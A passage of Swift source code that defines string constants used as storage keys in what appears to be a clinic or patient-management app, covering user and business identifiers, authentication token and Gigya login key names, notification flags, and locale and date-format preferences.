    static let IsNRP = "IsNRP"
    static let email = "email"
    static let firstName = "firstName"
    static let lastName = "lastName"
    static let access_token = "access_token"
    static let refresh_token = "refresh_token"
    static let isVerified = "isVerified"
    static let userId = keyValue.userId.rawValue
    static let userType = "userType"
    static let userTypeId = "userTypeId"
    static let businessId = "businessId"
    static let businessName = "businessName"
    static let businessPhone = "businessPhone"
    static let countryId = "CountryId"
    static let userRelationGuid = "UserRelationGuid"
    static let deviceTokenString = "deviceTokenString"
    static let fcmToken = "fcmToken"
    
    static let isNotificationIconClicked = "isNotificationIconClicked"
    static let notificationsAnalysisTypeId = "notificationsAnalysisTypeId"
    static let notificationspId = "notificationspId"
    
    static let languageId = "languageId"
    static let languageCountryCode = "languageCountryCode"

    static let isRemembered = "isRemembered"
    static let isRememberedUser = "isRememberedUser"
    static let patientId = "patientId"
    static let templateId = "templateId"
    
    static let followedPatientOptionType = "followedPatientOptionType"
    static let contactEmail = "ContactEmail"
    static let prefixTypeId = "prefixTypeId"
    
    static let dateFormat = "dateFormat"
    static let timeFormat = "timeFormat"
    
    static let gigyaApiKey = "gigyaApiKey"
    static let gigyaDomainName = "gigyaDomainName"
    static let gigyaCountryId = "gigyaCountryId"
    static let gigyaCountryName = "gigyaCountryName"
    static let gigyaUserID = "gigyaUserID"
    static let isViewDOSPrice = "IsViewDOSPrice"
    static let isLinkedRefLabClinic = "IsLinkedRefLabClinic"
    static let isAlertMessageAvailable = "IsAlertMessageAvailable"
    static let totalAlertCount = "totalAlertCount"
    static let mappingData = "mappingData"
    static let isLicenseAgreement = "IsLicenseAgreement"
    static let userGuid = "UserGuid"
    static let businessGuid = "BusinessGuid"
    static let stateName = "StateName"

    static let privacyPolicyLink = "PrivacyPolicyLink"
    static let termsOfUseLink = "TermsOfUseLink"
    
    static let refLabClinicId = "RefLabClinicId"
    static let timeZoneSelectedId = "timeZoneSelectedId"
    static let dateFormatSelectedId = "dateFormatSelectedId"
    static let timeFormatSelectedId = "timeFormatSelectedId"
    static let isFirstTimeLaunched = "isFirstTimeLaunched"
    static let isRefLabActive = "isRefLabActive"

}
